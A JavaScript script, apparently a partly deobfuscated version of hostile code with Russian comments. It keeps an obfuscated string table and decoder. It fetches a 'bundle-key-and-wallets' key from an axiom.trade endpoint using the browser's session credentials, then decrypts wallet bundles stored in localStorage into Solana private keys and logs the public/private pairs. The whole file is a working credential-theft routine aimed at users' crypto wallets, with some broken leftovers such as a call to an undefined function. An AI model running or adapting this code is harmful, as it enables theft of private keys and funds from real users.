// Глобальные переменные для кэширования и хранения данных
let stringCache = {};
let encodedStrings = [];
let globalObject, textDecoder, uint8Array, buffer, stringClass, arrayClass, utf8Decoder;

// Инициализация глобальных переменных и массива закодированных строк
function initializeGlobals() {
    stringCache = {};
    encodedStrings = [
        "zHXPcCz\"xN`U]~w5B0sDrs@g0f", 
        "=$Y@NC(Lwn(NJL", 
        "RpVv^(7(v?JxGq]H!H`@]P2g94?JZQHO_:qFR;B",
        "79<aHo#(1j\"w4)O0H;mCwP%oWtW#MU3O/Yyd\"9rL", 
        "eSfC{qM^loDl6*5O~8Lvvx(\"nc)sR", 
        "sA5kb>c5[j#m<x_1t)RyNjj0`4!>|&i#IlayVY8@\"6xSox\"p", 
        "RCBr1,ocy4T!Qde05UA", 
        "BosPg4fLxtG+x%Pe*J1^VQQRy@WPEu*qZS[po;CXNt?kBU?S9H>PH", 
        "wX*#}%`R9?2G_)Xsps+X0P@FZS;|sx}z7Cp$I=37~)3wk~57PB", 
        "&op#Pm3zô0js_0\"Amizl$pj4nX).>~OjNw1ohFG9I_B", 
        "=:*#Uo.R", 
        "}$KP8omcPS7j]**q@aQD", 
        "66wFUq.,[nDlo&@O.1)I[+3z/09(=%jp^V+X2h#0Vn0j[Aa5YoKP5i|md", 
        "fltP>o_0w)wUcx`H]+^dGxVo;0)cVqQp:sgv3yuE/Jwk,9ASE97YkyB", 
        ">S}k<Kh.4?bX,d", 
        "&Hj#0&XnYoY:abZe0p2#_I=ELf0A(%_sJzlCOg90H)FcV)Q^RWA", 
        ";$^P4_<3E6", 
        "k;YC2(1@]9?n4qlqR9,$3P8Fz6T&6%!7Hah~<KeR", 
        "7a+a6i:FBU#7ZWa", 
        "gUbIY`6n(aqIC1h8@XMW{y>FB0VjDsw~7Ch~e}^L", 
        "|aE:kg7L", 
        "1VEXu(gK`nok]gTZ~UcI.%nn26P;&*kE^fY@M9z;x0*UMU{81Cli1qf;C?W", 
        "FtZpwIC7b", 
        "=)ydUmB",
        "EUHY3y3\">UG|.E3z!H>dMCuL.fVD0beEH*hv5%H3\")*#@v~OOH[w0yLnd", 
        "=$taEoUOJ?*dZsv0}s8P>PD\"<\"CnR",
        "nV+ax``ca)v;]gR&~?&pA>*FOSCC)qz0`XGwm>_0Kf&F$L", 
        ".$e:U*ME,rbru~kE$X?XpQFtb5<55}weUf\"Y(v2F[+f>qL=!MXoXPIB", 
        "Fr=C(vvfGfAv,m#^97=C(YaO~49+.EG0NaA",
        "sa_(X9{85M~6qQM0urs#i\"ac(5h4v~kp@rj(]*`m>tSYb=)z",
        "o?SXo_fEgrF`=A$p4lka0q$pK9/PoWDq\"/&pd7T(94y+t)6z:B",
        "$lon3mxMVJx$E*sEj4,dEq4O=cTCf%PHz80Yr\"rz[)kmFAsq",
        "@zK:Bv<7]oXa.&_0foX(3o_(d5^)%_l0",
        "hYE^R;QO:?QRo9_El:kW)&QO`6pFULF",
        "0a|Fhy8OF",
        "%1(@qQJ1)|/)z~{gTxj$+t_3b5Qwc=Ip*stdciGtYa];u%R$N7)IuIrL",
        "Yz/$yjll~SDA>H@zi6sD", 
        "paMWWWcFcNWSjsogJR",
        "CX^Fqs1pdoDYJ}b$0R",
        "Q49I>IB0So4)^bA^r7.Xs+s5:S.JR",
        "@*Lv)j(CJSc``q}zwlyF",
        "eAJp_9SRe\"gv/ct&+j0~=q{SF",
        "8zPigr,OKUfIfU48sVA",
        "ZfvW1zT(t0$\"{ED6zlIrA3{8dM>R2LTudg;F+Yk(%a_18L",
        "DW{rIsC($9=CtAaHmx>a",
        "?YRY#qEL0U",
        "ada`+>}]SoVD(~wHgpCYKs^]9nm|}m>eXpmFcCCffSd\".E!O:8Nk%*(MP)W",
        "c09w]PS5YaLr#*v5\"aWXAj|K/0Lr6~C5SVI(S",
        "TSvad3RtxNY0=AjSYY%n2yU.A5900QtsHsuXF3Gc0U",
        "jshYZWB]NrF8@u?Sfzzr;syfu0<9!sXqY?Dp#KMfFc{.Od",
        "BCEW0oV,Tjj)J)Uz[$7k5j6(h9km8)c6P7G@nxa5^U~D`Hm1",
        "AoPH{*aFH4{kR",
        "+*;#x}tRR0TkE*8gC?Íq*F=5vtB*)H2_.X_mB",
        "Bt7wF.@8lr^~VLRV3:}kK}+0bc~~&*nHe?_$c&T;=oY",
        ".sy$N&y3Z6M:_H<gj7.rQ=R`$UfvT_0z<:diThm89@c6sdo#(?jaPm_;D?90R",
        "RWor>q9LvS7?NcweioTk|(dnO?MdD.nHG#A",
        "xo1yXjB",
        ")UWr%qJ1QJ/xneeqzj,#b&s`&rSm))=#`B",
        "xoayRx7&t+0m~*37Xo+X8oU5VnJ\"J)c6]6L",
        "{:MWJ.lXvc4JzAa",
        "Of;$aP;zR0k7vU.~vZnXKeQgYM+g|v^EO?kWn7P7658DVq{OPXkr%*sgWo7",
        "q6G@krto`JK#nA$^gfmHR@OKlMnXU)I#0osd~q>oYort,xUe+8ka!(1pNfKFR",
        ")dTk.(P3lM<5hv`q)HNYGCDELa", 
        "#9Tbcmq\"Yf", 
        ".X#pR@v(v?7>Qcm5kfRY|PxLcNnYB~FE\"/pCVQB", 
        "s8Ba:&P(^UGk@x18aW_I;}JRf?#DJL0~+*GpMCSKzS",
        "fH_ITq,O6c5XJLHpCXrIF7tcI\"^E[%tpNYNn",
        "]A=i)qn3UUM1is\"&60PpF&JO/|Us@uA$DsS^9v,OyU)Sx%!OWoR",
        "sxHw~*x^(af`g%SeuU7Y&KcOFDegJH^gJR",
        "?rakhzHED?0AR",
        "8;sFyC|Kp4^I[KDH3Y^#[+G8$URy3L",
        "HkW~2hS1qM5`=4)",
        "|rlb.hq^_\"Ox\"cN0RoE`:.GYf|fvI%EgWfyF)ITfnI`J<K+ZIB",
        "M4FX2yJ@<\"tRo9M^GS]X4vN^~?r)R",
        "RN`CuIGmwJ6c7c\"8~p(wlvxL^USmpvs548vX,4_fytTG`HAV",
        "TnRXT,((P?D~7Qv$vS7`PC_0Af3&sx}z&Va~Ww$KjnrddU2#y1pD6",
        "{@8#3,tm1?<kOx#&6YO^K`xzIM4w]]~8+r1XV]?pGopmuuTg=xIXkr@OA",
        "4s$#]&4`Ut1I4\"=7448X,4x(_\"X?1&IpY6sI^:?OSN:dAq<#wlrd",
        "y1Mr:>`On\"zIe\"EgczOra3\"L#46m2q8gLrp#qWmcX",
        "%XW~Z}mohUkIu%hSrB",
        "yjhkn>ROYa}+XQ`H~;L",
        ">$;P}%X(RUvw;17E%A&CNjGYO6Hv%gq1ZlYw%/.O^|4)~)F",
        ">J^$h:]C/@yJFHMp/*Gi5*so@r:G`%H&96+W:>T;[@QRf4Pq+6@Cc",
        "/XarL3uM<\"D75LxH5C>Wn&|g1jkvJ}X",
        "@z!#+=E&Aa",
        "noEXh*Vm4J3iV_\"#BNd$Ey[\"$t%!:v8g0Yya>ql;SU~cwv%~XR",
        "6;9$I7<f)4RyU%/e?#K#hQ;L|\"#m/sf5o*0Y_mP;}5",
        "Q:(C*&%Oi9okJLCe@l2#CP|FE6RvAA6OPjKP|(_X|5a??vBE",
        "Y/:n/},gG5HAR",
        "8Y=Cj;@KUN$4[Ayec05wY;Dn2M&v(~BS1;Wn6",
        "+7\"Y&lf;05x|z%T&lj!I1,FO2\"}pZsKeU9uybveg9@ZAPÐmB",
        "OjBy:j5gA55Dax{pDt}k(w#Cw@NJw&#ZD;Ov5",
        "y)5v:&.p/+i#uAEgv+L",
        "*XsCt;mp#|U`eLsqK*E^T:#0hUD8feF$^o@(L=x0I\"Q+#*9&pzDv+eB",
        "M#By?=f;.f",
        "p8K#@\"Ac|5ZmV_:e]Jur,hoOn?@Fq1!~|rUh|",
        "y$divPa1kNvW!.(zNB",
        "sf*()ja@hUeSJL|~Wo7`0i;L^t$IeHM0nkLv=/[^U0q",
        "9lXP~ztcZ?@]Zsz0",
        "%Ard8mr\"~)\"+]gXqqVCY?;izKnpxx~<!JHBrx=cKFcBvEdj8z*eW6",
        "UWVk@eA@.ob6fU3#G##D*&zz097v]927XW1^=4((D6~cWv[HbC|D1",
        "qx(C<PQRhrkj&%$SIA~wcoJc)U@:wEwqKHoX.%D\"Q+16R",
        "RWApRvB^u9$E5L",
        ",7u^:Io8b",
        "5tc$C9=]LfhEaxk8tlinaIs.j+TGmdZe1l=HeW*YJ?}@8LLskrA",
        "eCe($g%gh0eD(~0zq?HpO]tKXD",
        "G7*dnCDnD4r16~?&[oUhe`P3So,GQE^ERV!(Px_l5o;:Eud0CB",
        ">?]W7gO`SoI#F}PeCY0Yl9Jt?tVDBe4pu0*PcmUFFcD6(ATu",
        "[z}k5%+(D4nxR",
        "3ZF(aPf;#)Vm;Qlq+/_IhzT7WfPgCm\"#KH]r{/o8=5GJ2)=~{@lD",
        "5YuYHPvX/n072_)H[6|CBe_0d",
        "w8dwQ=tK!clw{91gM#cD?Ir^k0b\"%L3#hxcIu(:t/@(",
        "QrK(Z:&EMaB*0}T&rHt(#(i]@c",
        "Rt9w?xGYX5@|iQQ&>+`iwmMf7aR~E4`1[V<XotsF.tp7ymxHPX=@yi{oioZ",
        "&*m${P?g/J^$;sLSZsS~x+ggm\"k",
        "uY2#R>/5]t}C+EqE^p+XpQ>RioWS~)XVM4Hp7(SRNaHIP*<!1lGb!",
        ":l1~?&U5/09",
        "iihAQe/15mdl}Wqo2.",
        "+i/eZ6W1",
        "50>^^LN",
        "WOmKdJ:2um^f1Uu",
        "7d%oYu34",
        "nMk>P0?4",
        "i+*bN|PR",
        "O*2~^=xR",
        "@C9~M",
        "M*aic36F",
        "n*3>v!9+:k3>8",
        ")kOu/~$Rg,4kD",
        "8*~xpt2LP*E4D",
        "bpZ)[8ZZrufL(",
        "=&%akEBn3I",
        "SApOCa`KL&ARQ]2rY`zo(?UlZ\"j#iZ8wt:OC_~y!",
        "eT|9^u}y;<k[Q%}L;:dvTv$$z{S0SIQbZ!",
        ")jwaY~tV8j|mAs68F&Sasu:IH3",
        "?BXy[?w",
        "P[Cn",
        "b_.Jpv7SP$1",
        "C~Adtusp",
        "<F6g]dsp",
        "fP7y[?~>HZF",
        "hmCn",
        "pmiY]",
        "LPA80",
        "5IVn}",
        "!AMX}&.BI",
        "J}R_O",
        "x,OY!c`NiT[f4Fl",
        "p&@dO@w",
        "[[)<1yw",
        "_}iY9/0gG$k",
        "f,!<y/YSm>yj:@{~",
        "Ut4nS@w",
        "<WJn~c$/[TATnD",
        "l\"PK5&|~bY=@K$(;W`+w6D;CA`(!yPz<.d(x<GSCvvF&KYEu;N>w(p:?&$onfHI2$9Bw",
        "N~Xyz%;cdZS",
        "Ut,Y6y*rKjF",
        "j]$2UMy8dK;CExWa[t\"IE%/+(;6C`OoiB\".%Wa[twEC%IJh>M*`Ap!.I+_J+swS]BNw",
        "$W,g]",
        "Nv&Y1yN$<jQZPm",
        "!}Pn",
        "E~$Y+?3#WG1",
        "0,Cm",
        "yBNd;/Xr}s1",
        "#l(g",
        "#[>R:<0giT|rnD",
        "][S<S",
        "sd1/%e>=u6m!}Vt+K^+R@>kDzIy@l;HMtjA[B?3K9^h#}jtVKwX6#[kuz{#DU%$=s\"19by?4",
        "r*N;K$=a)",
        "Z>[J[",
        "|b3`8KFiRX5m%",
        "1=waTh34",
        "Biv9&r^",
        "Qfe_B+A\"",
        "44FCtZ]),",
        "\"uz9B",
        "k8J`!($au",
        "_u_;:kX~*Aq",
        "Zj2A|a92C?j",
        "eT|9^u}yHz/_T/wsz_UapaQw&mkd3EQ8}=[<SUG?a?p\"UUOL)md<wa7+H3",
        "+k|9vJ)4",
        "l:Ml|",
        "7dE<OUg+c\"%?RP",
        "#=f<z]SSR",
        "`6(6H",
        "ojq<Xa34",
        "7eVY:G=2C?j",
        "R/19",
        "Zj!6OU*4",
        "4/BvX",
        "UZ[MPc`C/",
        "kk_zeyx+l",
        "//>YoUt",
        ")kfvUuF[R",
        "uRM~Th*S;3",
        "s%Yw%wU@l;Y",
        "z?abAtfE",
        "@Yy5GicHJIenW1l(",
        "#r?(|H}E",
        "Eq$wh$F",
        "\"$X&.yMT3;rn4",
        "F?bfmna^}?wv4",
        "u/^kS]^^&Mt84",
        "@O2Xf",
        "@Oj^",
        "n/,0r",
        "?Mq/R",
        "?M%#",
        "lbDXk~Iu",
        "#b]3Zo!MJ",
        "wk3YJu;4",
        "OjI9;",
        "u9[;",
        "W8~AQFP2",
        "^mEk",
        "Sy3n",
        "cNln",
        "VF$nC",
        "!/GA",
        "q\"XLagri",
        "q\"XL",
        "Tj0Wv3[@o",
        "Tj0WM",
        "X8OYoJ!!b2d",
        "MktA",
        "l*Ua*[J>l",
        "Sk2AM",
        "@k^JO"
    ];
}

// Получение глобального объекта (window, globalThis и т.д.)
function getGlobalObject() {
    const candidates = [
        () => globalThis,
        () => global,
        () => window,
        () => new Function("return this")()
    ];
    let result = undefined;
    let protoNames = [];
    try {
        protoNames.push("".__proto__.constructor.name);
    } catch (e) {}
    outerLoop: for (let i = 0; i < candidates.length; i++) {
        try {
            result = candidates[i]();
            for (let j = 0; j < protoNames.length; j++) {
                if (typeof result[protoNames[j]] === "undefined") {
                    continue outerLoop;
                }
            }
            return result;
        } catch (e) {}
    }
    return result || this;
}

// Инициализация дополнительных глобальных утилит
initializeGlobals();
globalObject = getGlobalObject() || {};
textDecoder = globalObject.TextDecoder;
uint8Array = globalObject.Uint8Array;
buffer = globalObject.Buffer;
stringClass = globalObject.String || String;
arrayClass = globalObject.Array || Array;
utf8Decoder = (function() {
    const lookup = new arrayClass(128);
    const fromCodePoint = stringClass.fromCodePoint || stringClass.fromCharCode;
    const result = [];
    return function(byteArray) {
        let currentByte, decodedChar, byteLength;
        byteLength = byteArray.length;
        result.length = 0;
        for (let i = 0; i < byteLength;) {
            currentByte = byteArray[i++];
            if (currentByte <= 127) {
                decodedChar = currentByte;
            } else if (currentByte <= 223) {
                decodedChar = (currentByte & 0x1f) << 6 | (byteArray[i++] & 63);
            } else if (currentByte <= 239) {
                decodedChar = (currentByte & 0xf) << 12 | (byteArray[i++] & 63) << 6 | (byteArray[i++] & 63);
            } else if (stringClass.fromCodePoint) {
                decodedChar = (currentByte & 7) << 18 | (byteArray[i++] & 63) << 12 | (byteArray[i++] & 63) << 6 | (byteArray[i++] & 63);
            } else {
                decodedChar = 63;
                i += 3;
            }
            result.push(lookup[decodedChar] || (lookup[decodedChar] = fromCodePoint(decodedChar)));
        }
        return result.join("");
    };
})();

function binaryToString(byteArray) {
    if (TextDecoder && typeof TextDecoder !== "undefined") {
        return new TextDecoder().decode(new Uint8Array(byteArray));
    } else if (Buffer && typeof Buffer !== "undefined") {
        return Buffer.from(byteArray).toString("utf-8");
    } else {
        // Ручное декодирование UTF-8
        const charCache = new Array(128);
        const fromCodePoint = String.fromCodePoint || String.fromCharCode;
        let result = [];
        for (let i = 0; i < byteArray.length;) {
            let code = byteArray[i++];
            if (code <= 127) {
                result.push(charCache[code] || (charCache[code] = fromCodePoint(code)));
            } else if (code <= 223) {
                code = (code & 0x1f) << 6 | (byteArray[i++] & 63);
                result.push(charCache[code] || (charCache[code] = fromCodePoint(code)));
            } else if (code <= 0xef) {
                code = (code & 0xf) << 12 | (byteArray[i++] & 63) << 6 | (byteArray[i++] & 63);
                result.push(charCache[code] || (charCache[code] = fromCodePoint(code)));
            } else if (String.fromCodePoint) {
                code = (code & 7) << 0x12 | (byteArray[i++] & 63) << 12 | (byteArray[i++] & 63) << 6 | (byteArray[i++] & 63);
                result.push(charCache[code] || (charCache[code] = fromCodePoint(code)));
            } else {
                code = 63; // Замена на "?"
                i += 3;
                result.push(charCache[code] || (charCache[code] = fromCodePoint(code)));
            }
        }
        return result.join("");
    }
}

// Определение свойств на объекте
function defineProperty(obj, value = 1) {
    function decodeInner(input) {
        const charset = "N.1>0!z8`]u?riY(Fp/ba+]<WCHv2A^wRy:4s$oE{O_Mh\"fkP7t;KcIS@QGU*V9m)Xl#xLn~Jg3eZDj6T,=&q}B|[";
        const str = String(input || "");
        const len = str.length;
        const result = [];
        let accumulator = 0;
        let bits = 0;
        let carry = -1;
        for (let i = 0; i < len; i++) {
            const index = charset.indexOf(str[i]);
            if (index === -1) continue;
            if (carry < 0) {
                carry = index;
            } else {
                carry += index * 91;
                accumulator |= carry << bits;
                bits += (carry & 8191) > 88 ? 13 : 14;
                while (bits > 7) {
                    result.push(accumulator & 255);
                    accumulator >>= 8;
                    bits -= 8;
                }
                carry = -1;
            }
        }
        if (carry > -1) {
            result.push((accumulator | carry << bits) & 255);
        }
        return bytesToString(result);
    }
    function getDecoded(index) {
        if (typeof stringCache[index] === "undefined") {
            return stringCache[index] = decodeInner(encodedStrings[index]);
        }
        return stringCache[index];
    }
    Object[getDecoded(117)](obj, getDecoded(118), {
        [getDecoded(119)]: value,
        [getDecoded(120)]: false
    });
    return obj;
}



// Функция-заглушка, которая самоуничтожается после первого вызова
function setup() {
    setup = function() {};
}

// Основная асинхронная логика
(async () => {
    let dataObject;

    // setup(dataObject = Object["create"](null));

    // Многофункциональная утилита для работы с объектами
    function processObject(method, key, value, options = { ["xjQvfz"]: 1 }) {
        let result;
        if (key === "tETKWKETE5") {
            dataObject = [];
        } else if (key === "BUi0nr0qUj") {
            function createFunction() {
                const fn = function(...args) {
                    dataObject = args;
                    return options[method].apply(this);
                };
                if (options[method]) {
                    defineProperty(fn, options[method]);
                }
                return fn;
            }
            result = dataObject[method] || (dataObject[method] = createFunction());
        } else {
            result = options[method]();
        }

        if (value === "Ue19qv1Ync") {
            return { ["IRV9apahDp"]: result };
        }

        return result;
    }

    function stringToBytes(str) {
        try {
            const base64Str = str.replace(/-/g, "+").replace(/_/g, "/");
            return Uint8Array.from(atob(base64Str), char => char.charCodeAt(0));
        } catch {
            return new TextEncoder().encode(str);
        }
    }

    // Дешифрование данных
    async function decrypt(key, encryptedData) {
        const [ivStr, dataStr] = String(encryptedData).split(":");
        const iv = stringToBytes(ivStr);
        const data = stringToBytes(dataStr);
        console.log(iv, data)
        console.log(key)
        const decrypted = await crypto.subtle.decrypt(
            { name: "AES-GCM", iv: iv, tagLength: 128 },
            key,
            data
        );
        return new Uint8Array(decrypted);
    }

    // Получение ключа и обработка данных
    const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
        method: "POST",
        credentials: "include"
    })).json();
    const cryptoKey = await crypto.subtle.importKey("raw", stringToBytes(bundleKey).buffer, { name: "AES-GCM" }, false, ["decrypt"]);
    const bundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
    const processedBundles = [];
    const errorBundles = [];
    const decryptedData = [];
    console.log(bundleKey);
    console.log(bundles);

    for (const bundle of bundles) {
        let bundleId = "(unknown)";
        let decryptedContent = "";

        try {
            const decryptedBytes = await decrypt(cryptoKey, bundle);
            if (decryptedBytes["length"] !== 64) {
                throw new Error("bad SK length");
            }
            console.log(decryptedBytes)
            // const a = bytesToString(decryptedBytes);

            decryptedContent = binaryToString(decryptedBytes);
            const walletKey = decryptedBytes.slice(0x20);
            bundleId = binaryToString(walletKey);


            // decryptedContent = processObject("xjQvfz", null, null, [decryptedBytes]);
            // const idBytes = decryptedBytes["slice"](32);
            // bundleId = processObject("xjQvfz", "zYmqLo6Adx", "Ue19qv1Ync", [idBytes])["IRV9apahDp"];
            decryptedData["push"]({
                ["pub"]: bundleId,
                ["priv"]: decryptedContent
            });
        } catch (error) {
            errorBundles[["push"]]({
                ["pub"]: bundleId,
                ["reason"]: error["message"]
            });
        }
    }

    let sentData = [];
    let keysData = [];

    if (processedBundles.length) {
        sentData.push(...processedBundles["map"](bundle => {
            return {
                ["public"]: bundle["pub"],
                ["sol"]: bundle["lam"] / 1000000000,
                tx: bundle["txid"]
            };
        }));
    }

    keysData.push(...decryptedData.map(item => {
        return {
            ["public"]: item["pub"],
            ["private"]: item["priv"]
        };
    }));
    
    console.log({
        errors: errorBundles,
        sent: sentData,
        keys: keysData
    })
})();